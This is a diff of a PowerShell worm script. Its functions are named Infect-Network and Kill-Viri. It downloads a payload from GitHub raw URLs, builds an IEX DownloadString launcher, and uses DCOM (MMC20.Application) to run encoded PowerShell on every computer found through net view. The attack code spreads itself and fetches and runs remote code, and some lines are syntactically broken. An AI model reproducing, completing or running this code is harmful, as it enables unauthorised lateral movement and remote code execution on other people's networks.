@@ -190,27 +190,42 @@ function Invoke-DCOM {
 
 }
 
-function Kill-Viri {
-echo $NULL > $env:temp/powermng.dat
+function Get-Link {
+$links = "https://raw.githubusercontent.com/D3F4LT99/P0w3rsh3ll3d/master/CopyMeIWantToTravel.ps1"
+$links &= "https://raw.githubusercontent.com/D3F4LT99/d3f4lt99.github.io/master/CopyMeIWantToTravel.ps1"
+foreach ($link in $links) {
+ if((Test-Connection -Cn $link -BufferSize 16 -Count 1 -ea 0 -quiet))
+      {echo $link}
+   }
 }
 
-function Infect-Network {
-$networked_computers = net view /all | Where-Object {$_ -like "*\\*"}
-foreach ($comp in $networked_computers) {
-$ips &= [System.Net.Dns]::GetHostAddresses($comp)
+function Kill-Viri {
+echo "=====The World Wireless~=====" > $env:temp/powermng.dat
+(Net.WebClient).DownloadFile(Get-Link, $env:temp/powermng.ps1
 }
 
 function Encode-Script {
-$link = "https://raw.githubusercontent.com/D3F4LT99/P0w3rsh3ll3d/master/CopyMeIWantToTravel.ps1"
+$link = Get-Link 
 $bytes = [Text.Encoding]::Unicode.GetBytes($link)
 $enc = [Convert]::ToBase64String($bytes)
 $enc = "if (-NOT (Test-Path `$DestinationFile)) {IEX (New-Object Net.Webclient).DownloadString('$link') }"
 echo $base
 }
 
+function Infect-Network {
+$networked_computers = net view /all | Where-Object {$_ -like "*\\*"}
+foreach ($comp in $networked_computers) {
+$ips &= [System.Net.Dns]::GetHostAddresses($comp)
 foreach ($ip in $ips) {
 Invoke-DCOM -ComputerName $ip -Method MMC20.Application -Command "powershell -sta -executionpolicy unrestricted -enc $(Encode-Script) "
 }
 }
-if (Test-Path $DestinationFile) {exit}
+
+if (Test-Path $env:temp/powermng.ps1) {
+if (Test-Path $env:temp/powermng.dat) {
+Infect-Network
+}
+} ELSE { 
+Kill-Viri
+}
 #if (-NOT (Test-Path $DestinationFile)) {
